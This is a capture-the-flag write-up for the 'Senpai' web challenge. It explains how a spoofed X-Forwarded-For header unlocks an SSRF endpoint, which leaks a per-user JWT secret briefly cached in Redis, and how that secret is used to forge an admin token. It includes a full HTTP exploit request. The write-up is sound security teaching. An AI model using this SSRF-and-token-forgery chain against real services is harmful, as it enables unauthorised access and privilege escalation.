# Senpai

> Rin or Sakura?\
> \
> http://chals.ctf.sg:40201\
> \
> author: Gladiator

### Authentication Logic

The end-goal, of course, is to get to `/flag`, but there is a `role` attribute in the JWT token that we must change to `admin` in order to pass the `IsAdmin` check.

```go
func flagHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	role, _ := config.GetTokenRole(r)
	username, err := config.GetTokenUsername(r)
	if err != nil {
		http.Error(w, "An error has occured", http.StatusBadRequest)
		return
	}
	user, _ := data.GetUser(username)
	if (config.TokenValid(r, user.Otp)) == nil {
		if config.IsAdmin(role) {
			fmt.Fprint(w, logic.Flagger())
		}
		return
	}
	return
}
```

Let's look at the registration and login flow. This time, it seems like `user.Otp` is actually the JWT key - each user's key would be different!

```go
func newJWTUserKey() string {
	partOne := strings.Replace(config.GenUUID(), "-", "", -1)
	partTwo := strings.Replace(config.GenUUID(), "-", "", -1)
	partThree := strings.Replace(config.GenUUID(), "-", "", -1)
	newOTP := partOne + partTwo + partThree
	return newOTP
}

func Register(account data.RegisterAccount) bool {
	var newAccount data.UserAccount
	newAccount.Username = account.Username
	newAccount.Password = account.Password
	newOTP := newJWTUserKey()
	newAccount.Otp = newOTP
	newAccount.Verified = "true"
	return data.InsertUser(&newAccount)
}
```

The JWT key is then used to sign the token when we log in.

```go
func loginHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	var login data.UserAccount
	err := json.NewDecoder(r.Body).Decode(&login)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	state, jwtKet := logic.Login(login)
	if state == false {
		http.Error(w, "Account does not exists, or account credentials are wrong", http.StatusBadRequest)
		return
	}
	token, _ := config.CreateToken(login.Username, jwtKet)
	fmt.Fprint(w, "Account logged in, your token is: "+token)
}
```

What's interesting, though, is that there is a caching mechanism that stores each user's JWT key in a Redis cache after logging in. Presumably, in real-world applications such a caching mechanism would save time in performing database lookups each time JWT authentication occurs.

```go
func Login(account data.UserAccount) (bool, string) {
	var user *data.UserAccount
	user, _ = data.GetUser(account.Username)
	if user == nil {
		return false, ""
	}
	if config.CheckPasswordHash(account.Password, user.Password) == false {
		return false, ""
	}
	if user.Verified == "false" {
		return false, ""
	}
	cache.Set(user.Username, user.Otp, 999999999999)
	return true, user.Otp
}
```

Sidenote: the key is only stored for two seconds, so we have to be quick here!

```go
func Set(key string, jwtkey string, exp int) error {
	client := redis.NewClient(&redis.Options{
		Addr:     "localhost:6379",
		Password: "",
		DB:       0,
	})
	err := client.Set(key, jwtkey, time.Second*2).Err()
	if err != nil {
		return err
	}
	return nil

}
```

### SSRF and Obtaining Cached Secrets

There exists a non-admin path, `/sakura` that does allow us to interact with the Redis cache.

```go
func sakuraeHandler(w http.ResponseWriter, r *http.Request) {
	config.SetupResponse(&w, r)
	output := logic.CacheHelper(r)
	fmt.Fprint(w, output)
	return
}
```

However, we could see in the cache-fetching mechanism that the client URL is validated to be `127.0.0.1`.

```go
func IsLocal(ip string) bool {
	return ip == "127.0.0.1"
}
```

```go
func CacheHelper(r *http.Request) string {
	ip, _ := remoteaddr.Parse().IP(r)
	if !config.IsLocal(ip) {
		return "I get older but your lovers stay my age."
	}
	result, err := cache.Get(r.URL.Query().Get("key"))
	if err != nil {
		return ""
	}
	return result
}
```

That leaves us with `/rin`. The handler logic presents us with the all-too-familiar SSRF code:

```go
func HeavensFeel(r *http.Request) http.Response {
	val := config.Process(r)
	if val == "" {
		return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
	}
	resp, err := http.Get(val)
	if err != nil {
		return http.Response{Status: "500 Internal Server Error", StatusCode: 500, Body: nil}
	}
	return *resp
}
```

Again, the client IP is checked. But this time, the logic is slightly different. Instead of using `remoteaddr.Parse().IP(r)`, the server is directly looking at the `X-Forwarded-For` header!

```go
var local string = "X-Forwarded-For"

...

func GetIP(r *http.Request) string {
	return r.Header.Get(local)
}

...

func Process(r *http.Request) string {
	if IsLocal(GetIP(r)) {
		return r.URL.Query().Get("url")
	}
	return ""
}
```

By adding `X-Forwarded-For: 127.0.0.1`, we can access this function and perform an SSRF to the `/sakura` endpoint.

```http
POST /rin?url=http://localhost:8081/sakura?key=socengexp HTTP/1.1
Host: chals.ctf.sg:40201
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE2NDcyNDI0NDIsInJvbGUiOiJ1c2VyIiwidXNlcm5hbWUiOiJzb2NlbmdleHAifQ.Y56UmyxoibdVHxvFjN03GI_RXeIgVBl76pQZDmih6Mo
X-Forwarded-For: 127.0.0.1
```

As mentioned earlier, the cached secret only exists for 2 seconds after logging in, so we must make the above request right after logging in.

### Gaining the Admin Role

When we have the JWT secret, we could essentially craft any JWT attributes we want.

Using [https://jwt.io/](https://jwt.io) (or any JWT-signing library), supply the JWT secret and change the `role` to `admin`. We now have a new JWT token with an admin role.

![](<../../.gitbook/assets/Screenshot 2022-03-14 at 12.41.08 PM.png>)

Using this new JWT token, simply make a request to `/flag` to get the flag!

The flag is `CTFSG{Rin_Tohsaka_Best_Girl_uwu}`.
